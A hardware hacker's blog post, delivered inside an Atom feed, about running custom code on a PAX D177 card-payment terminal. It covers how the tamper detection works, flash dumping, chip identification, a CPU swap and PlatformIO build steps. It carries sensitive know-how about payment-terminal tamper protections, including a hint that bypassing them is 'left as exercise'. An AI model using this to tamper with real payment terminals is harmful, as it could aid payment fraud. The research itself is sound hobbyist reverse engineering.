<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://lucasteske.dev/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lucasteske.dev/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-09-05T22:00:40+00:00</updated><id>https://lucasteske.dev/feed.xml</id><title type="html">Lets Hack It</title><subtitle>Sou Lucas Teske, gosto de Eletrônica, Computação, Física.  Todos os hacks que eu fizer, serão colocados aqui. Aceito sugestões :D</subtitle><author><name>Lucas Teske</name><email>letshackit@nvx.li</email></author><entry><title type="html">Running code in a PAX Credit Card Payment Machine (part1)</title><link href="https://lucasteske.dev/2025/09/running-code-in-pax-machines" rel="alternate" type="text/html" title="Running code in a PAX Credit Card Payment Machine (part1)" /><published>2025-09-05T19:30:00+00:00</published><updated>2025-09-05T19:30:00+00:00</updated><id>https://lucasteske.dev/2025/09/running-code-in-pax-machines</id><content type="html" xml:base="https://lucasteske.dev/2025/09/running-code-in-pax-machines"><![CDATA[<h2 id="disclaimer">Disclaimer</h2>

<p><strong>All procedures described here were done with public available stuff</strong> - No security flaws were actually explored here to get code execution. The processor swap technique <strong>does not bypass the tamper protections neither allow a fake machine to actually emit payments.</strong></p>

<p>Brazilian credit card payment machines <em>usually</em> are in state of the art regarding security measures. I remember once a Elavon employee told me that <strong>Brazil got all the first releases of payment machines and systems</strong>. When asked why, he said: <strong>frauds in Brazil are sophisticated enough, that if the system is secure enough to Brazil, it works for anywhere in the world</strong>.</p>

<p>In the future, I will make an article about the security measures that both, MegaHunt, PAX and Brazilian companies implement in their machines to avoid systems to be tampered with.</p>

<p>If you’re sharing / commenting over this article, please put the same disclaimer there. I don’t mind using information here to make new articles, but Brazil suffers a <strong>lot</strong> with fake news (specially involving security hardware made here) and someone can think that makes it possible to hack their credit cards or accounts (you know, people lacking the knowledge to actually understand whats involved).</p>

<h3 id="head-notes">Head Notes</h3>

<p>This article is sort of incomplete. I will still publish the reverse engineering of the boot rom and how I created an emulator to better map out what the firmares do. Here I just mention briefly that I did an emulator and I think that deserves its own article. I will update this head note when they’re published.</p>

<p>I want to thank <a href="https://www.linkedin.com/in/gutem/">Gutem</a> and <a href="https://www.instagram.com/penegui">Penegui</a> for a quick technical review of the tech content of the article, and Pag, which gave a really fast and friendly response when I sent to them. A short timeline is provided at bottom of this page.</p>

<h2 id="credit-card-payment-machines">Credit card payment machines</h2>

<p>Here in Brazil, there are several companies that act as payment gateways and these sort of stuff. I would guess the biggest ones are <a href="https://pagbank.com.br/">PagSeguro</a> and <a href="https://mercadopago.com.br/">MercadoPago</a>. While PagSeguro is originally from Brazil, MercadoPago is from Argentina and came from a completely different business (MercadoLivre, which is basically the south american equivalent of eBay).</p>

<p>There are also lots of banks that also has payment machines nowadays, but I would guess most of them, if not all, buy the machines from a Brazilian manufacturer called <a href="https://www.tectoy.com.br/">TecToy</a> (which was previously done only by <a href="https://www.transire.com/">Transire</a>, but now they’re merged into the same company).</p>

<p>I find it funny, because TecToy is a toy maker, but they are huge and old and basically one of the few surviving companies that <strong>actually make hardware</strong> in Brazil. Nonetheless to say, the machines are not designed by them, but most by Chinese OEM. Mostly nowadays, its either <a href="https://www.paxglobal.com.hk/">PAX</a> or <a href="https://www.sunmi.com/">Sunmi</a>.</p>

<p>In Brazil, its very easy and cheap to buy them basically anywhere, easiest ones are from the companies I described above (Pag and MP). For example, for PagSeguro, you can find them in their website.</p>

<p>Just for a reference, by the time I wrote this article, US$1 ~ R$5,48 so most of these machines are under US$20, which is cheap even for Brazilian standards by the hardware they posses.</p>

<p>Mercado pago is a bit more expensive, but easier to buy since you can just go to their normal market place (Mercado Livre) which is like EBay and buy the machines (see <a href="https://lista.mercadolivre.com.br/maquina-de-cart%C3%A3o#D[A:Maquina%20de%20Cart%C3%A3o]">https://lista.mercadolivre.com.br/maquina-de-cart%C3%A3o#D[A:Maquina%20de%20Cart%C3%A3o]</a> )</p>

<p>In short: they are usually PAX based machines, with same “Operating System” but custom application which are totally different beast between then. Additionally, Pag also does “Merchant OEM” and <strong>lots</strong> of payment companies that offer machines actually use a unbranded Pag machine and use their API for doing all the stuff (so for any Brazilians reading this, if you buy a machine that’s not from MP or Pag, chances are, its from Pag anyways).</p>

<p>For sake of simplicity, these machines correspond to these PAX ones:</p>

<ul>
  <li>Mini Chip 3 - PAX D188 (Baremetal)</li>
  <li>Moder Plus 2 - PAX D195 (Linux OS)</li>
  <li>Moder Pro 2 - PAX Q92S (Linux OS)</li>
  <li>Mini NFC 2 - PAX D177 (Baremetal)</li>
  <li>Mini Smart 2 - Sunmi P2 (Android)</li>
</ul>

<p>For this article, I decided to use the Mini NFC 2, which is a simple and cheap PAX D177. Worth notice, that even though the Chip 3 (D188) looks way more advanced, it has basically the same hardware as D177, but an additional LTE Modem and a bigger screen. Firmware that runs on both <strong>are basically the same</strong>.</p>

<h2 id="first-works-and-identifying-stuff">First works and Identifying stuff</h2>

<p>So usually for reversing secure hardware, I buy <strong>at least</strong> three machines when possible. Usually it goes like:</p>

<ol>
  <li>Will open, let every single protection trip on it</li>
  <li>Will use to <strong>try</strong> bypass protections (if needed to my objective)</li>
  <li>Will keep as is, for comparing with a working machine.</li>
</ol>

<p>In that specific scenario, I just wanted to run DOOM on them, just because, if it computes, it needs DOOM.</p>

<p>I had previous experience reverse engineering these machines, so most of the article is just an example how I would do it (for this article, it actually took me few years to get to the current state) and how I remember I did. So I was expecting:</p>

<ol>
  <li>Heavy security
    <ol>
      <li>Tamper protection</li>
      <li>Clock Glitching protection</li>
      <li>RNG Manipulation protection</li>
      <li>Code signatures</li>
      <li>Code encryption</li>
    </ol>
  </li>
  <li>Lots of frustration</li>
</ol>

<p>I could go into two ways for code running: Exploiting it, swapping CPU. For exploiting it, I would need to find a flaw that allowed to execute code through Bluetooth, Smartcard, NFC or USB. These are the only interfaces. For that, I would need to have the entire code, and as we will see, that was sort of not possible.</p>

<p>Second way, would be to get whatever CPU was in the board, remove it and install a new and unfused one. The problem with that, is to actually find the CPU to sell anywhere.</p>

<p>So either way, I would need to open the machine and identify stuff.
Just for the reference, the machine was this one:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/cb3d6416e80906d1e1a3cfa7c27ec46c_MD5.jpeg" alt="" /></p>

<p>On the back side, there are few screws which are easily removed. I usually do this with the <strong>machine turned on</strong>. So I can see which actions would trigger the tamper protection.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/942368afcd3a8b5c2f6280b0686279ad_MD5.jpeg" alt="" />
Removing the screws does not trigger the tamper protection, but removing the case does. In the picture below, you can see the case removed, and I highlighted two of the tamper detection points.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9a88c682e238fdb16c61122c76c2e14c_MD5.jpeg" alt="" />
on the back side of the case, there is some carbon-rubber points that touch these tamper points in the PCB. It works exactly the same as video game consoles controller buttons, but in this case, they just ensure the “button is always pressed”.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/3744913eb7cc7b866b64eb363d6fbbe5_MD5.jpeg" alt="" /></p>

<p>And for some reason, the machine decided to tell us which one of the tampers we triggered :)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9b728a005ceb00f991633d8d6ece65ed_MD5.jpeg" alt="" />
Also this resets over boot, do if you bridge them, you can use it to identify the names of each tamper point hehe.</p>

<p>So in this bottom part, we can see some stuff. There is the round coin cell battery in the left, and there is a big boring green PCB. They’re basically over the card reader and all the core circuits.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/4454b7008ef72e53db283abd4afafb86_MD5.jpeg" alt="" /></p>

<p>Although this PCB looks boring, don’t get fooled by it. That’s basically a 4 layer PCB with a DENSE mesh inside it. Any damage or removal will trigger another tamper point. Just for quick reference, this is a scan of the PCB:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/930418d0ee33dd3362d0ac27de43fa8e_MD5.jpeg" alt="" /></p>

<p>Removing all the plastic stuff, we reach the main PCB:
<img src="/assets/Running code in a PAX Credit Card Payment Machine/1d47f48f4cf614dd72e26c37c839895c_MD5.jpeg" alt="" /></p>

<p>There is lot of stuff, but the stuff that we care in the bottom.
<img src="/assets/Running code in a PAX Credit Card Payment Machine/e808d21c32ba0866a386d155077709e4_MD5.jpeg" alt="" /></p>

<p>Here we can see some interesting stuff:</p>

<ul>
  <li>MH1903 - Our main SoC (CPU)</li>
  <li>NXP 8035S - Smartcard Interface PHY</li>
  <li>FM17660 - NFC Reader</li>
  <li>XM25Q65 - 16MB SPI Flash Memory</li>
</ul>

<p>(And as you guessed, we trigger about every tamper point in the back)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/55e76a7d0d22410d56bada5afad18bd8_MD5.jpeg" alt="" /></p>

<p>The flash memory, we can dump it. I have both tampered and untampered dumps from it. Bypassing tamper is left as exercise for the reader :). But if you just want to understand how it works, you can just dump as is, since the tamper doesn’t actually erase the entire flash, but just some parameters for communicating with the payment servers.</p>

<p>I was expecting always that the flash would be encrypted, but it isn’t. Still, we can’t change its contents since its signed (everything is signed basically) so we can use it for reverse engineering but not for code execution. But its neat that it is a 16MB flash, so it fits a entire DOOM WAD file :D</p>

<h2 id="what-we-know-about-mh1903">What we know about MH1903</h2>

<p>So here is where things get REALLY annoying. This SoC is actually behind a curtain of obscurity. The core is done by MegaHunt, which only provides this as information:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/cf4f007fbd8b87c83cb0e4f3c3560cc7_MD5.jpeg" alt="" />
(see <a href="https://www.megahuntmicro.com/en/index.php?catid=5">https://www.megahuntmicro.com/en/index.php?catid=5</a> )</p>

<p>Digging it a bit deeper in google, we can find few suppliers that has more info. It has <strong>lots</strong> of variants, but in short their core is the same, just changing exposed pins and/or flash/ram inside the SoC. That specific one, is the QFN88 version which has the following specs:</p>

<ul>
  <li>RAM: 1MB</li>
  <li>FLASH: 1MB</li>
  <li>SPI: 4</li>
  <li>ADC: 5</li>
  <li>DAC: 1</li>
  <li>GPIO: 64</li>
  <li>USB: 1</li>
  <li>Serial: 4</li>
</ul>

<p>As you can see, there is an internal flash which is a pity for me. I’m still building my gear to be able to probe directly to the flash. I already did some decaps, and the flash isn’t embedded in the main silicon, but just glued over the main die and bound wired to it. I heard from some people from semiconductor industry that this is because its very hard to do flash and CPU in the same process, at least with decent enough density, so its usually preferable (and cheaper) to make them separated.</p>

<p>One thing worth noticing though, the BGA versions does not have embedded flash, so their program are loaded from external flashes. Spoiler alert: the D188 has two flash memories onboard :)</p>

<p>Also there is the MH1903S variant with has a beefy spec on flash but less RAM and less GPIO / SPI</p>

<ul>
  <li>RAM: 640KB</li>
  <li>FLASH: 4MB</li>
  <li>SPI: 3</li>
  <li>ADC: 6</li>
  <li>DAC: 1</li>
  <li>GPIO: 56</li>
  <li>USB: 1</li>
  <li>Serial: 3</li>
</ul>

<p>So google didn’t had much information, although I did found some SDKs around github (mostly mirrored from chinese git) and I had to search in Baidu. So this part took a very long time, since lots of information are not available outside mainland china, and since there is several variants of MH1903, I got several datasheets with conflicting information. Also most of them I had to pay for accessing it on CSDN, which luckily there are some brokers that does that for you. In the foot of this page there is a note with a link to all datasheets I could find so if you ever need, there is there. Just be warned: lots of conflicted info and it seens some wrong and omitted stuff is everywhere.</p>

<p>So how did I test my assumptions? Well, I found <em>by a chance</em> that there is a arduino like chinese board from LUAT that uses an SoC called AIR105, it seens boring, but some of my baidu search pointed out that AIR105 actually uses a MH1903S core. The AIR105 are also available in aliexpress very easily to buy: <a href="https://s.click.aliexpress.com/e/_oBLNTrc">https://s.click.aliexpress.com/e/_oBLNTrc</a></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/427a383619233fb72eef5161e05511e8_MD5.jpeg" alt="" /></p>

<p>I bought a few, decaped one and guess what. it is indeed a MH1903S :D</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9138886ea831b06c18888099fd0e26a6_MD5.jpeg" alt="" />
As a reference, when I decaped one of t he SoC from the machine, the writing was 1903A:
<img src="/assets/Running code in a PAX Credit Card Payment Machine/feb55758da95a7ecb62f02451c058606_MD5.jpeg" alt="" />
Also, remember when I said flash memory is glued over the main die? Here is a shot showing both of them (sorry, I didn’t made a focus stacking). Flash memory is the one out of focus in the right. Bound wires are dead because I used 78% Nitric Acid and they’re copper ones.
<img src="/assets/Running code in a PAX Credit Card Payment Machine/551efee7006a314cf9d0b9257bb61edc_MD5.jpeg" alt="" />
<img src="/assets/Running code in a PAX Credit Card Payment Machine/4fd85cc5f052df9b22c267e7559b0af5_MD5.jpeg" alt="" />
So basically, we could assume they’re similar at least. Their datasheets also tell about the same thing (seems like the only different is actually flash + ram)</p>

<p>The block diagram for this CPU is described in datasheet, and this is basically the only info that matches across <strong>all</strong> datasheets I’ve found:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/8cd0cc82e5b752464a0617442e0c765f_MD5.jpeg" alt="" /></p>

<p>So SC300 is actually a ARM spec called SecurCore. Its a Cortex M3 (in case of MH190x is a M4F) with some security enhancements. For example, although they’re 32 bit simple ARMs, they have security boundaries between OS &lt;&gt; App which are configured in memory controller registers (primitive version of TrustZone). It also follows some standards that are only available under NDA, and I can only guess what they’re. Just for quick reference: The CPUs inside your credit cards, follow the exact same specification.</p>

<p>Datasheets also specifies some memory maps, which at least all datasheets agree, although its <strong>clearly</strong> not everything the device has. For example, MH claims that CPU has hardware acceleration for RSA, AES, hashes and stuff, but there is nothing in memory map of the datasheet. I found out later, that they’re just being obscure or require a NDA to that. I will eventually map everything by reverse engineering apps I dumped and some SDK with binaries I found over the internet. Also please let me know if these addresses matches any target arch you actually played with. I couldnt find anything, so it seens not a direct clone of any existing SoC in the market (I speculated a STM32 or ATSAMD but they dont match).</p>

<table>
  <thead>
    <tr>
      <th>Address Range</th>
      <th>Peripheral name</th>
      <th>Bus Name</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0x4000_0000-0x4000_03FF</td>
      <td>SSC</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_0800-0x4000_0BFF</td>
      <td>DMA</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_0C00-0x4000_0FFF</td>
      <td>USB</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_1000-0x4000_13FF</td>
      <td>LCD</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_8000-0x4000_BFFF</td>
      <td>OTP</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4006_0000-0x4006_FFFF</td>
      <td>DCMI</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4008_0000-0x4008_FFFF</td>
      <td>CACHE</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x400A_2000-0x400A_2FFF</td>
      <td>QSPI</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x400A_3000-0x400A_3FFF</td>
      <td>SPIM5</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4001_0000-0x4001_0FFF</td>
      <td>SCI0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_2000-0x4001_2FFF</td>
      <td>CRC</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_3000-0x4001_3FFF</td>
      <td>Timer0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_4000-0x4001_4FFF</td>
      <td>ADC</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_5000-0x4001_5FFF</td>
      <td>SCI2</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_6000-0x4001_6FFF</td>
      <td>UART0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_7000-0x4001_7FFF</td>
      <td>UART1</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_8000-0x4001_8FFF</td>
      <td>SPIM1</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_9000-0x4001_9FFF</td>
      <td>SPIM2</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_A000-0x4001_AFFF</td>
      <td>SPIM0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_B000-0x4001_BFFF</td>
      <td>SPIS0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_C000-0x4001_CFFF</td>
      <td>Watchdog</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_D000-0x4001_DFFF</td>
      <td>GPIO</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_E000-0x4001_EFFF</td>
      <td>TRNG</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_F000-0x4001_FFFF</td>
      <td>SYS_CTRL</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4002_0000-0x4002_FFFF</td>
      <td>MSR</td>
      <td>APB1</td>
    </tr>
    <tr>
      <td>0x4003_0000-0x4003_7FFF</td>
      <td>BPU</td>
      <td>APB2</td>
    </tr>
    <tr>
      <td>0x4004_4000-0x4004_4FFF</td>
      <td>UART2</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_5000-0x4004_5FFF</td>
      <td>UART3</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_8000-0x4004_8FFF</td>
      <td>KEYBOARD</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_9000-0x4004_9FFF</td>
      <td>I2C0</td>
      <td>APB3</td>
    </tr>
  </tbody>
</table>

<p>RAM is mapped in the usual place for most of these ARM Cortex chips. They’re based on 0x2000_0000, and span up to the max size (640KB for MH1903S and 1MB for MH1903). The bit bands are also in the places we expected, being 0x2200_0000  for the SRAM. There are also more devices there, that I didn’t wrote here. These will have their own article after I finish mapping it everything I can.</p>

<p>The main MH1903S datasheet shows two variants of the QFN88, one having a <code class="language-plaintext highlighter-rouge">_J</code> suffix. The non J has a internal 3.3V regulator which is very handy for boards like the AIR105. By reverse engineering the D177 machine board, it seems like the pin-out almost exactly matches the J variant. We will see later, that I had a hard time because I assumed that the datasheet would be correct.</p>

<h2 id="finding-out-how-things-are-wired">Finding out how things are wired</h2>

<p>So first thing, I need to figure out <strong>at least</strong> where the UART is wired (if wired). I know the USB is wired to the hardware USB (since pins are fixed) but for some reason, I don’t see the boot rom up in the USB so I must find the direct UART.</p>

<p>UART pins are usually exposed for diagnostics during manufacturing, either that or JTAG. JTAG (or more specific here, SWD) in case of this device is disabled during boot, so I decided to not waste much time finding it in the board.</p>

<p>So how to start finding things on the board? Well I usually like to remove <strong>all</strong> components from the board and make a nice scan of it (using normal paper scanners). Then I overlay the pinout of the CPU and “trace back”. A nice application to do that is <a href="https://inkscape.org/">Inkscape</a>. It allows you to draw stuff vector based, and scanned images has 1:1 size match with real world (in case you need measurements).</p>

<p>Then I draw the pads as gray rectangles, name them:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/bacf2a2ebe249871db70adb98d4fa2b7_MD5.jpeg" alt="" />
I usually like to mark vias as well, since these boards are multilayred and you probably will need it to fully follow the tracks:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/fdeaa9034f0f2a2217c7d55f05e2e6f4_MD5.jpeg" alt="" />
For example this TX/RX tracks passes through the front of the PCB as well (don’t mind the misalignment, not sure why the image currently is like that)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/652fd1331e348c4861938eadf3f0a824_MD5.jpeg" alt="" />
After following it through, I reached 2 of the 5 test pads in the right corner of the backside of the PCB, which I also marked in inkscape.
<img src="/assets/Running code in a PAX Credit Card Payment Machine/985831c28a29ecc016e52f876980476a_MD5.jpeg" alt="" />
So now that I had the UART, I could use it to reprogram the machine after a CPU Swap.
And for those who are wondering: this UART, application wise, is the same as the USB port and Bluetooth so no leaky stuff (usually) is there, but the same thing the mobile application acesses it. And if it does, you don’t actually need to open it, since Bluetooth / USB will leak it the same.</p>

<h2 id="cpu-swap">CPU Swap</h2>

<p>So one of the easiest ways I could get code running and skip requiring bypassing the secure boot of the MH devices is by just getting the CPU and swap. Some might consider this a vulnerability, although I personally don’t consider it: Even if someone gets hand in the entire code for the machines, there are still the keys and data loaded into the NVRAM which are used for the card transactions. I already saw some cases few years ago that the keys were actually stored inside the flash memory (so if you nuke the CPU before the tamper detect, you retain everything). That’s not the case of these machines.</p>

<p>Sadly these MH1903 devices are pretty rare to buy outside mainland china. From time to time they appear in Aliexpress as well. Here is an affiliate link: <a href="https://s.click.aliexpress.com/e/_oBMot6n">https://s.click.aliexpress.com/e/_oBMot6n</a> although it might be dead when you check this out (since they’re pretty rare).</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/c94d5244a68733e5cfbec91c6f08f5f0_MD5.jpeg" alt="" /></p>

<p>So its a bit expensive, R$34 (CPU) + R$15 (TAX) per device, plus R$28 shipping. I bought 5 of them just in case which was about R$150 (US$28) with the shipping.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/edad8e809adbb209bf4eca20043fd1dd_MD5.jpeg" alt="" />
Few years ago I tried swapping the CPU in that machine without any success. So I thought the issue was that the variant I had wasnt the J but the same as AIR105 (which would sort of make sense) and that made me sad. But I decided to try swap one of the AIR105 for that one just to dump the bootloader (more bootloaders = more info)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/8fabf3473c8ee086fdea127b537c4ef6_MD5.jpeg" alt="" /></p>

<p>After trying to that, I noticed the board was fully dead. No power besides the +5V. After swapping two boards I remember something I saw in the datasheet:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/725ff8aa056e6d095a4ac1ea1882fa1a_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/839cea0de243ff5cc485a19e6a0fb849_MD5.jpeg" alt="" />
One of the differences between the J and non J version, is that the <strong>non J</strong> version (in this case AIR105) had an internal 3.3V LDO. And checking the schematics of the AIR105 board, guess what? No regulator onboard, everything was powered from the LDO.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/87356f1a4622aa38a746dd5676123bf5_MD5.jpeg" alt="" /></p>

<p>So it would make sense that the board doesn’t have any power at 3.3V, since the J version does not have it. So I decided to give another try swapping the CPU on the D177 board. For that, I decided a fully fresh start: new machine with the box just open and a not used MH1903 CPU. The result? Nothing from the board. Not on UART, not on USB (and there should be both activity).</p>

<p>Basically what happened is that, the boot rom never answered to handshake calls, which was odd. So I decided to give a try on the AIR105 board, just to notice that the board actually had to be reset by toggling the RTS signal in the serial port.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/fd96942840f9a3924a76e5d843ee88a2_MD5.jpeg" alt="" />
So that made me wonder: How was it resetting the board? By looking at the pin-out, there is no reset button. But looking at AIR105 board schematic, we see a interesting thing:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/217023812ae3d8552e72a67306105efa_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/0c7f3862853471f760b69c71098168a4_MD5.jpeg" alt="" /></p>

<p>Basically, the board didn’t had any coin-cell battery where it should, just a capacitor for emulating the board (the XH311H battery in the schematic, is just a not populated connector in the board), and what the reset pin actually did, was to <strong>short it out</strong> the power supply at that pin, making it 0V. And guess what? The datasheet told me all the time, but my lack of Chinese reading skills just bypassed it 😆</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/7a75d13b7c4758f46f7c29717f7907cd_MD5.jpeg" alt="" />
For those (like me) which is very rusty in Chinese, the marked text says basically: Battery power supply, must be powered otherwise the chip cannot work.</p>

<p>So I investigated a bit the boot rom (I will post more details about the reverse engineering of that chip boot rom later) and I noticed that what happens is that, when the VBAT33 signal drops below about 2.3V, it triggers a tamper in the CPU. The way CPU deals with tamper is to actually reset itself, which in turn wipes the secure NVRAM and set some registers that can be checked by the boot rom or application. So basically, the reset button of the AIR105 is basically a tamper button 😆</p>

<p>So looking at the D177 PCB, there is no specific test pad to actually act as a reset, but usually to avoid spending the coin cell battery energy when the power is supplied there is a series diode which I can use for soldering my reset wire. By tracing the pads I could find that the diode was in edge of the board.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/ea6eb39aabf1f914c71bda9f6eb79907_MD5.jpeg" alt="" /></p>

<p>So I just soldered a wire there, open my <a href="https://github.com/racerxdl/air105-uploader/">air105-uploader</a> program and manually set it to GND and <strong>PROFIT</strong></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/a4da09ed6fa71e3bd9b38a0097594756_MD5.jpeg" alt="" />
Now I could run code in the real machine!</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/3247c212e1baa37421f763ede653c022_MD5.jpeg" alt="" /></p>

<h2 id="building-code-to-it">Building code to it</h2>

<p>I won’t get into much detail here (since this article is already getting bigger than I expected) but the TL;DR: LuatOS provides a way to build stuff, and has a “boiler plate” for initializing all the lua stuff. The CPU itself is a ARM Cortex so its easily buildable by GCC, just requiring a custom linker script to stitch everything in the right place.</p>

<p>Basically, I reused about everything I did for the AIR105, just changed the linker-script to be aware that MH1903 actually has 1MB of RAM instead 640KB. For making it easier to use, I created some <a href="https://platformio.org/">platform.io</a> libs that you can use directly.</p>

<p>If you want to try it, just install it through pip</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install</span> <span class="nt">-U</span> platformio
</code></pre></div></div>

<p>Then you can create a new project:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>my-project <span class="o">&amp;&amp;</span> <span class="nb">cd </span>my-project
pio init
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The following files/directories have been created in /tmp/m
include - Put project header files here
lib - Put project specific (private) libraries here
src - Put project source files here
platformio.ini - Project Configuration File
Project has been successfully initialized!
</code></pre></div></div>

<p>After that, you can just edit platformio.ini to map it to use the air105 platform:</p>
<div class="language-toml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[env:air105]</span>
<span class="py">platform</span> <span class="p">=</span> <span class="err">https://github.com/racerxdl/platformio-air</span><span class="mi">105</span>
<span class="py">board</span> <span class="p">=</span> <span class="err">mh</span><span class="mi">1903</span>
<span class="py">framework</span> <span class="p">=</span> <span class="err">baremetal</span>
<span class="py">;monitor_port</span> <span class="p">=</span> <span class="err">SERIAL_PORT</span>
<span class="py">;monitor_speed</span> <span class="p">=</span> <span class="mi">115200</span>
<span class="py">monitor_rts</span> <span class="p">=</span> <span class="mi">0</span> <span class="err">;</span> <span class="err">AIR</span><span class="mi">105</span> <span class="err">board</span> <span class="err">has</span> <span class="err">inverted</span> <span class="err">RTS</span>
<span class="py">build_flags</span> <span class="p">=</span> <span class="err">-g</span> <span class="err">-ggdb</span>
</code></pre></div></div>

<p>You can change <code class="language-plaintext highlighter-rouge">board</code> parameter between <code class="language-plaintext highlighter-rouge">mh1903</code> and <code class="language-plaintext highlighter-rouge">air105</code> depending on what you’re targeting. The MH1903 is the 1MB variant, so code will crash on AIR105 due stack being positioned at the end of RAM space.</p>

<p>And for running:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pio run <span class="nt">-t</span> upload
</code></pre></div></div>

<p>This should build and upload (using the air105-uploader) directly. It will also download any toolchain and libs needed to do so. You can also add <code class="language-plaintext highlighter-rouge">-t monitor</code> to spawn a serial console and see the return from the machine.</p>

<p>The source code for the framework and platform on platform.io links are in the end of this article.</p>

<h2 id="magic-stuff">MAGIC STUFF</h2>

<p>So, this article is getting huge and I feel lots of details will be badly written if I keep pushing content here. After all, this is like a 4 years+ research project. So I will eventually write two more articles about how I did map some magic stuff.</p>

<p>When I say magic stuff, next sections of this article will assume we know how the LCD is wired to the CPU, which I initially guessed it was in the same port as  the flash memory we saw in the PCB. TL;DR it is, but not the Chip Select, neither the LCD backlight control, and these were not trivial to find since the LCD pinout is non-standard and I couldn’t find any datasheet of it.</p>

<p>I did emulate the firmware to figure out some stuff (other stuff was just looking at decompiled sections) and the magic stuff I discovered is that the pins that control the LCD, are mapped into a GPIO that <strong>does not exists</strong> according to the datasheet 😃 (Spoiler, there are <strong>two</strong> undocumented GPIOs and few other stuff)</p>

<p>For now, let’s just pretend I wrote a nice article on how I did those. I promise I will write a new one with details on the reverse engineering and the details on how I made an emulator for it (that could even show the LCD images) 👀</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/e129a7f1554e79536be3ca8d71fe03d9_MD5.jpeg" alt="" /></p>

<h2 id="making-the-crasharalho">Making the “crasharalho”</h2>

<p>The “crasharalho” is a sticker I use a lot in discord and telegram. “Caralho” is sort of the portuguese equivalent of “fuck” in the sense “OMG”. So the Crash Bandicoot screaming it on the machine, seem a perfect fit.</p>

<p>Making it was easy, just created a 160x128 image in GIMP and stamped the sticker there.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/67e6e21e4aca4b6c3ceeb47bf2b57530_MD5.jpeg" alt="" />
Gimp is also nice that it can export directly to a C header, sort of compressed with a macro to actually get each R,G,B pixel values. So it was pretty easy to convert it.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* GIMP header image file format (RGB): include/crasharalho.h */</span>

<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">width</span> <span class="o">=</span> <span class="mi">160</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">height</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>

